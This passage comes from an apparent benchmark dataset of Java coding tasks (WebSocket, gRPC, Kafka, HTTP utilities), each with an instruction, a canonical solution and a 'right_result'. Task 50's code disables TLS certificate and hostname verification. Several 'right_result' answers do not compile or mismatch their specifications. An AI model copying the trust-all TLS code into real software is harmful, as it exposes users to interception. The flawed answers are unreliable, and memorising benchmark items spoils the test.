    "right_result": "```java\nimport javax.websocket.OnError;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport org.springframework.stereotype.Component;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Component\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = SpringConfigurator.class)\npublic class ContainerDeployServerEndpoint {\n\n    private static final Logger log = LoggerFactory.getLogger(ContainerDeployServerEndpoint.class);\n\n    @Autowired\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        try {\n            session.getBasicRemote().sendText(\"Connection established for container ID: \" + id);\n            containerService.deployContainer(id);\n            session.close();\n        } catch (Exception e) {\n            log.error(\"Failed to deploy container with ID: {}\", id, e);\n            try {\n                session.getBasicRemote().sendText(\"Deployment failed: \" + e.getMessage());\n                session.close();\n            } catch (Exception ex) {\n                log.error(\"Failed to send error message to client\", ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        log.error(\"WebSocket error occurred: \", throwable);\n        try {\n            session.close();\n        } catch (Exception e) {\n            log.error(\"Failed to close session after error\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 493,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java to handle real-time communication between clients, manage client connections, and broadcast messages to all connected clients.\n\nClass Description: MyWebSocket is a Java class that serves as a WebSocket server endpoint. It maintains a list of connected clients, handles connection events, processes incoming messages, and broadcasts messages to all connected clients while also logging messages to a database.\n\nAttributes:\n- onlineCount: [static int] - Tracks the number of currently connected clients\n- webSocketSet: [static CopyOnWriteArraySet<MyWebSocket>] - Thread-safe set containing all active WebSocket sessions\n- session: [Session] - Represents the WebSocket session for a connected client\n- contentService: [ContentService] - Service for persisting messages to a database (autowired via Spring)\n\nMethods:\n- onOpen: [onOpen]([Session session]) -> [void] - Handles new client connections, adds session to the set, and increments online count\n- onClose: [onClose]() -> [void] - Handles client disconnections, removes session from the set, and decrements online count\n- onMessage: [onMessage]([String message, Session session]) -> [void] - Processes incoming messages and broadcasts them to all connected clients\n- onError: [onError]([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- sendMessage: [sendMessage]([String message]) -> [void] - Sends a message to the client and persists it to the database\n- getOnlineCount: [getOnlineCount]() -> [int] - Returns the current number of connected clients (synchronized)\n- addOnlineCount: [addOnlineCount]() -> [void] - Increments the online client count (synchronized)\n- subOnlineCount: [subOnlineCount]() -> [void] - Decrements the online client count (synchronized)",
    "Canonical_solution": "import com.crossoverJie.pojo.Content;\nimport com.crossoverJie.service.ContentService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.socket.server.standard.SpringConfigurator;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(value = \"/websocket\",configurator = SpringConfigurator.class)\npublic class MyWebSocket {\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<MyWebSocket>();\n    private Session session;\n\n    @Autowired\n    private ContentService contentService;\n\n    @OnOpen\n    public void onOpen(Session session){\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n        System.out.println(\"\u6709\u65b0\u8fde\u63a5\u52a0\u5165\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnClose\n    public void onClose(){\n        webSocketSet.remove(this);\n        subOnlineCount();\n        System.out.println(\"\u6709\u4e00\u8fde\u63a5\u5173\u95ed\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        System.out.println(\"\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u6d88\u606f:\" + message);\n        for(MyWebSocket item: webSocketSet){\n            try {\n                item.sendMessage(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n                continue;\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error){\n        System.out.println(\"\u53d1\u751f\u9519\u8bef\");\n        error.printStackTrace();\n    }\n\n    public void sendMessage(String message) throws IOException{\n        Content content = new Content() ;\n        content.setContent(message);\n        SimpleDateFormat sm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:dd\") ;\n        content.setCreatedate(sm.format(new Date()));\n        contentService.insertSelective(content) ;\n        this.session.getBasicRemote().sendText(message);\n    }\n\n    public static synchronized int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public static synchronized void addOnlineCount() {\n        MyWebSocket.onlineCount++;\n    }\n\n    public static synchronized void subOnlineCount() {\n        MyWebSocket.onlineCount--;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(\"/websocket\")\npublic class MyWebSocket {\n\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<>();\n    private Session session;\n    private ContentService contentService;\n\n    @OnOpen\n    public void onOpen(Session session) {\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n    }\n\n    @OnClose\n    public void onClose() {\n        webSocketSet.remove(this);\n        subOnlineCount();\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        for (MyWebSocket item : webSocketSet) {\n            try {\n                item.sendMessage(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        contentService.saveContent(message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendMessage(String message) throws IOException {\n        this.session.getBasicRemote().sendText(message);\n    }\n\n    public static synchronized int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public static synchronized void addOnlineCount() {\n        onlineCount++;\n    }\n\n    public static synchronized void subOnlineCount() {\n        onlineCount--;\n    }\n}\n```"
  },
  {
    "Task_id": 494,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for a chat application that broadcasts received messages to all connected clients.\n\nClass Description: The ChatEndpoint class represents a WebSocket server endpoint that handles real-time chat communication. It listens for incoming messages and broadcasts them to all currently connected clients.\n\nAttributes: None\n\nMethods:\n- message: [Name](String message, Session client) -> void - Handles incoming WebSocket messages. Receives a message string and the client session that sent it, then broadcasts the message to all connected sessions.\n  - Input Parameters:\n    - message: String - The chat message received from a client\n    - client: Session - The WebSocket session of the client that sent the message\n  - Output: None (messages are sent directly to client sessions)\n  - Throws: IOException, EncodeException - If there are issues sending messages to clients",
    "Canonical_solution": "import java.io.IOException;\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        System.out.println(\"message: \" + message);\n        for (Session peer : client.getOpenSessions()) {\n            peer.getBasicRemote().sendText(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.Set;\n\n@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n\n    private static final Set<Session> sessions = Collections.synchronizedSet(new HashSet<>());\n\n    @OnOpen\n    public void onOpen(Session client) {\n        sessions.add(client);\n    }\n\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        synchronized (sessions) {\n            for (Session session : sessions) {\n                if (session.isOpen()) {\n                    session.getBasicRemote().sendText(message);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that echoes received text messages back to the client asynchronously.\n\nClass Description: This class represents a WebSocket server endpoint that handles text-based communication with clients. It listens for incoming text messages and echoes them back to the sender using asynchronous communication.\n\nAttributes: None\n\nMethods:\n- echoText: [String text, Session session] -> void - Handles incoming text messages from clients. Takes the received text and the client session as input, then sends the same text back to the client asynchronously using the session's async remote endpoint.",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/text\")\npublic class MyAsyncEndpointText {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\n@ServerEndpoint(\"/echo\")\npublic class EchoWebSocketServer {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        try {\n            session.getAsyncRemote().sendText(text);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 496,
    "Instruction": "Task Description: Create a gRPC client class in Java that checks the health of a gRPC server using the gRPC Health Checking Protocol.\n\nClass Description: The GrpcHealthClient class establishes a connection to a gRPC server and provides functionality to check the server's health status. It manages the gRPC channel and stub for communication with the server.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [HealthStub] - The asynchronous gRPC stub for health check operations\n\nMethods:\n- GrpcHealthClient(String host, int port) -> [void] - Constructor that initializes the gRPC channel and stub with the specified server host and port\n- checkHealth() -> [HealthCheckResponse] - Sends a health check request to the server and returns the response\n- shutdown() -> [void] - Shuts down the gRPC channel gracefully",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.health.v1.HealthCheckRequest;\nimport io.grpc.health.v1.HealthCheckResponse;\nimport io.grpc.health.v1.HealthGrpc;\nimport io.grpc.health.v1.HealthGrpc.HealthStub;\n\npublic class GrpcHealthClient {\n\n    private final ManagedChannel channel;\n    private final HealthStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = HealthGrpc.newStub(channel);\n    }\n\n    public HealthCheckResponse checkHealth() {\n        HealthCheckRequest request = HealthCheckRequest.getDefaultInstance();\n        AwaitableStreamObserver<HealthCheckResponse> responseObserver = new AwaitableStreamObserver<>();\n        stub.check(request, responseObserver);\n        return responseObserver.getSingle();\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.health.v1.HealthGrpc;\nimport io.grpc.health.v1.HealthCheckRequest;\nimport io.grpc.health.v1.HealthCheckResponse;\nimport io.grpc.stub.StreamObserver;\n\npublic class GrpcHealthClient {\n    private final ManagedChannel channel;\n    private final HealthGrpc.HealthStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = HealthGrpc.newBlockingStub(channel);\n    }\n\n    public HealthCheckResponse checkHealth() {\n        return stub.check(HealthCheckRequest.newBuilder().setService(\"\").build());\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 497,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a database service, allowing for retrieval of blockchain data and dynamic properties.\n\nClass Description: The DatabaseGrpcClient class provides a gRPC client implementation for connecting to a database service. It establishes a connection to a gRPC server, provides methods to retrieve blockchain blocks and dynamic properties, and handles connection shutdown.\n\nAttributes:\n- channel: [ManagedChannel] - The communication channel between the client and the gRPC server\n- databaseBlockingStub: [DatabaseGrpc.DatabaseBlockingStub] - The blocking stub used to make synchronous RPC calls to the server\n\nMethods:\n- Constructor: [DatabaseGrpcClient](String host, int port) -> [void] - Creates a new client instance connecting to the specified host and port\n- Constructor: [DatabaseGrpcClient](String host) -> [void] - Creates a new client instance connecting to the specified host (using default port)\n- getBlock: [getBlock](long blockNum) -> [Block] - Retrieves a block from the blockchain; if blockNum is negative, returns the latest block\n- shutdown: [shutdown]() -> [void] - Shuts down the connection channel\n- getDynamicProperties: [getDynamicProperties]() -> [DynamicProperties] - Retrieves the dynamic properties of the blockchain",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.DatabaseGrpc;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.DynamicProperties;\n\npublic class DatabaseGrpcClient {\n\n  private final ManagedChannel channel;\n  private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n  public DatabaseGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public DatabaseGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return databaseBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return databaseBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public void shutdown() {\n    channel.shutdown();\n  }\n\n  public DynamicProperties getDynamicProperties() {\n    return databaseBlockingStub.getDynamicProperties(EmptyMessage.newBuilder().build());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\n\npublic class DatabaseGrpcClient {\n    private final ManagedChannel channel;\n    private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n    public DatabaseGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n    }\n\n    public DatabaseGrpcClient(String host) {\n        this(host, 50401); // default port\n    }\n\n    public Block getBlock(long blockNum) {\n        return databaseBlockingStub.getBlock(BlockNumber.newBuilder().setNum(blockNum).build());\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n\n    public DynamicProperties getDynamicProperties() {\n        return databaseBlockingStub.getDynamicProperties(EmptyMessage.getDefaultInstance());\n    }\n}\n```"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to a gRPC server for executing GraphQL queries and handling responses asynchronously.\n\nClass Description: The GraphQlGrpcClient class establishes a connection to a gRPC server, provides functionality to execute GraphQL queries, and handles server responses asynchronously. It manages the gRPC channel lifecycle and provides cleanup methods.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [GraphQlServiceGrpc.GraphQlServiceStub] - The asynchronous gRPC stub for making service calls\n- ON_COMPLETE: [CountDownLatch] - Synchronization aid to wait for response completion\n- logger: [Logger] - Logger instance for logging client activities\n\nMethods:\n- GraphQlGrpcClient(String host, int port) -> [Constructor] - Creates a client instance with specified host and port, using plaintext connection\n- GraphQlGrpcClient(ManagedChannel channel) -> [Constructor] - Creates a client instance with an existing channel\n- shutdown() -> [void] - Shuts down the channel gracefully with a 5-second timeout\n- query(String query) -> [void] - Executes a GraphQL query asynchronously and logs responses/errors",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.examples.graphql.GraphQlRequest;\nimport io.grpc.examples.graphql.GraphQlResponse;\nimport io.grpc.examples.graphql.GraphQlServiceGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n  private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n  private final ManagedChannel channel;\n  private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n  private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n\n  public GraphQlGrpcClient(String host, int port) {\n    this(ManagedChannelBuilder.forAddress(host, port).usePlaintext().build());\n  }\n\n  GraphQlGrpcClient(ManagedChannel channel) {\n    this.channel = channel;\n    stub = GraphQlServiceGrpc.newStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public void query(String query) {\n    GraphQlRequest request =\n        GraphQlRequest.newBuilder().build().newBuilder().setQuery(query).build();\n\n    stub.execute(\n        request,\n        new StreamObserver<GraphQlResponse>() {\n          @Override\n          public void onNext(GraphQlResponse value) {\n            logger.info(\"onNext: \" + value);\n          }\n\n          @Override\n          public void onError(Throwable t) {\n            logger.log(Level.WARNING, t, () -> \"onError\");\n            ON_COMPLETE.countDown();\n          }\n\n          @Override\n          public void onCompleted() {\n            logger.info(\"onCompleted\");\n            ON_COMPLETE.countDown();\n          }\n        });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.stub.StreamObserver;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class GraphQlGrpcClient {\n    private final ManagedChannel channel;\n    private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n    private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n    private final Logger logger = LoggerFactory.getLogger(GraphQlGrpcClient.class);\n\n    public GraphQlGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public GraphQlGrpcClient(ManagedChannel channel) {\n        this.channel = channel;\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            try {\n                channel.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                logger.error(\"Error while shutting down the gRPC channel\", e);\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public void query(String query) {\n        GraphQlRequest request = GraphQlRequest.newBuilder().setQuery(query).build();\n\n        stub.executeQuery(new StreamObserver<GraphQlResponse>() {\n            @Override\n            public void onNext(GraphQlResponse response) {\n                logger.info(\"Received response: {}\", response.getData());\n            }\n\n            @Override\n            public void onError(Throwable t) {\n                logger.error(\"Error occurred during query execution\", t);\n                ON_COMPLETE.countDown();\n            }\n\n            @Override\n            public void onCompleted() {\n                logger.info(\"Query execution completed.\");\n                ON_COMPLETE.countDown();\n            }\n        }).onNext(request);\n    }\n}\n```"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new topic in a Kafka cluster using the AdminClient API. It establishes a connection to the Kafka broker, defines the topic configuration (name, partition count, and replication factor), and creates the topic. The function ensures proper resource cleanup by closing the AdminClient after topic creation.\n\nInput:\n- brokerAddress: String - The address of the Kafka broker to connect to (e.g., \"localhost:9092\")\n- topicName: String - The name of the topic to be created\n- partitionCount: int - The number of partitions for the topic\n- replicationFactor: short - The replication factor for the topic\n\nOutput: void - The function does not return any value but creates the specified topic in the Kafka cluster. Any exceptions during topic creation will be thrown to the caller.\n\nNote: The function handles resource cleanup by closing the AdminClient in a finally block to prevent resource leaks.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Map;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\n\npublic void testDiskFailure() throws IOException {\n    AdminClient adminClient = KafkaCruiseControlUtils.createAdminClient(Collections\n        .singletonMap(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, broker(0).plaintextAddr()));\n    try {\n        adminClient.createTopics(Collections.singleton(new NewTopic(TOPIC0, PARTITION_COUNT, TOPIC0_REPLICATION_FACTOR)));\n    } finally {\n        KafkaCruiseControlUtils.closeAdminClientWithTimeout(adminClient);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.Collections;\nimport java.util.Properties;\n\npublic class KafkaTopicCreator {\n\n    public void createTopic(String brokerAddress, String topicName, int partitionCount, short replicationFactor) {\n        AdminClient adminClient = null;\n        try {\n            Properties props = new Properties();\n            props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, brokerAddress);\n            adminClient = AdminClient.create(props);\n\n            NewTopic newTopic = new NewTopic(topicName, partitionCount, replicationFactor);\n            adminClient.createTopics(Collections.singletonList(newTopic)).all().get();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to create Kafka topic: \" + topicName, e);\n        } finally {\n            if (adminClient != null) {\n                adminClient.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Create a Java utility class for making HTTP/HTTPS requests with support for custom timeouts, request methods, content types, and handling of both successful and error responses.\n\nClass Description: HttpUtil is a utility class that provides methods for making HTTP/HTTPS requests. It handles both secure (HTTPS) and non-secure (HTTP) connections, supports various request methods (GET, POST, etc.), and includes proper error handling and resource cleanup.\n\nAttributes:\n- Timeout: [int] - Default timeout value for connections (5000ms)\n- DefalutEncoding: [String] - Default character encoding for requests/responses (\"UTF-8\")\n- currentProxy: [Map] - Storage for proxy configuration (currently unused in the reference implementation)\n- allHostsValid: [HostnameVerifier] - Custom hostname verifier that accepts all HTTPS hosts\n\nMethods:\n- httpRequest: [httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding)] -> [String] - Makes an HTTP/HTTPS request with specified parameters and returns the response as a string\n- readString: [readString(InputStream inputStream, String encoding)] -> [String] - Helper method to read an InputStream into a String with specified encoding\n- X509TrustUtiil: [Nested class implementing X509TrustManager] - Custom trust manager that accepts all certificates for HTTPS connections\n\nThe class handles:\n1. Both HTTP and HTTPS connections\n2. Custom timeouts for connect and read operations\n3. Various request methods (GET, POST, etc.)\n4. Request headers (particularly Content-Type)\n5. Request body for POST requests\n6. Proper error stream handling\n7. Resource cleanup (connection closing, stream closing)\n8. SSL certificate verification bypass for HTTPS\n9. Character encoding for requests and responses",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.HashMap;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefalutEncoding = \"UTF-8\";\n    private static Map currentProxy = new HashMap();\n    public static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        if (\"\".equals(encoding) || encoding == null) {\n            encoding = DefalutEncoding;\n        }\n\n        URLConnection httpUrlConn = null;\n        HttpsURLConnection hsc = null;\n        HttpURLConnection hc = null;\n        InputStream inputStream = null;\n\n        String result;\n        try {\n            URL url = new URL(requestUrl);\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                TrustManager[] tm = new TrustManager[]{new X509TrustUtiil()};\n                sslContext.init(null, tm, new SecureRandom());\n                SSLSocketFactory ssf = sslContext.getSocketFactory();\n                hsc = (HttpsURLConnection) url.openConnection();\n                hsc.setSSLSocketFactory(ssf);\n                hsc.setHostnameVerifier(allHostsValid);\n                httpUrlConn = hsc;\n            } else {\n                hc = (HttpURLConnection) url.openConnection();\n                hc.setRequestMethod(requestMethod);\n                hc.setInstanceFollowRedirects(false);\n                httpUrlConn = hc;\n            }\n\n            httpUrlConn.setConnectTimeout(timeOut);\n            httpUrlConn.setReadTimeout(timeOut);\n            if (contentType != null && !\"\".equals(contentType)) {\n                httpUrlConn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            httpUrlConn.setDoOutput(true);\n            httpUrlConn.setDoInput(true);\n            httpUrlConn.connect();\n            if (null != postString && !\"\".equals(postString)) {\n                OutputStream outputStream = httpUrlConn.getOutputStream();\n                outputStream.write(postString.getBytes(encoding));\n                outputStream.flush();\n                outputStream.close();\n            }\n\n            inputStream = httpUrlConn.getInputStream();\n            result = readString(inputStream, encoding);\n            return result;\n        } catch (IOException var18) {\n            if (hsc == null) {\n                if (hc != null) {\n                    result = readString(hc.getErrorStream(), encoding);\n                    return result;\n                }\n                result = \"\";\n                return result;\n            }\n            result = readString(hsc.getErrorStream(), encoding);\n        } finally {\n            if (hsc != null) {\n                hsc.disconnect();\n            }\n            if (hc != null) {\n                hc.disconnect();\n            }\n        }\n        return result;\n    }\n\n    public static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedInputStream bis = null;\n        ByteArrayOutputStream baos = null;\n\n        try {\n            bis = new BufferedInputStream(inputStream);\n            baos = new ByteArrayOutputStream();\n            byte[] arr = new byte[1];\n\n            int len;\n            while ((len = bis.read(arr)) != -1) {\n                baos.write(arr, 0, len);\n            }\n        } finally {\n            if (baos != null) {\n                baos.flush();\n                baos.close();\n            }\n            if (bis != null) {\n                bis.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            return baos.toString(encoding);\n        }\n    }\n\n    static class X509TrustUtiil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.security.cert.X509Certificate;\nimport java.util.Map;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefaultEncoding = \"UTF-8\";\n    private static final Map<String, String> currentProxy = Map.of();\n    private static final HostnameVerifier allHostsValid = (hostname, session) -> true;\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws IOException {\n        if (encoding == null || encoding.isEmpty()) {\n            encoding = DefaultEncoding;\n        }\n        URL url = new URL(requestUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        if (url.getProtocol().toLowerCase().equals(\"https\")) {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new TrustManager[]{new X509TrustUtil()}, new java.security.SecureRandom());\n            ((HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());\n            ((HttpsURLConnection) connection).setHostnameVerifier(allHostsValid);\n        }\n\n        connection.setConnectTimeout(timeOut);\n        connection.setReadTimeout(timeOut);\n        connection.setRequestMethod(requestMethod);\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", contentType);\n\n        if (postString != null && !postString.isEmpty()) {\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = postString.getBytes(encoding);\n                os.write(input, 0, input.length);\n            }\n        }\n\n        try (InputStream inputStream = connection.getInputStream()) {\n            return readString(inputStream, encoding);\n        } catch (IOException e) {\n            try (InputStream errorStream = connection.getErrorStream()) {\n                if (errorStream != null) {\n                    return readString(errorStream, encoding);\n                } else {\n                    throw e;\n                }\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private static String readString(InputStream inputStream, String encoding) throws IOException {\n        StringBuilder result = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, encoding))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                result.append(line);\n            }\n        }\n        return result.toString();\n    }\n\n    private static class X509TrustUtil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        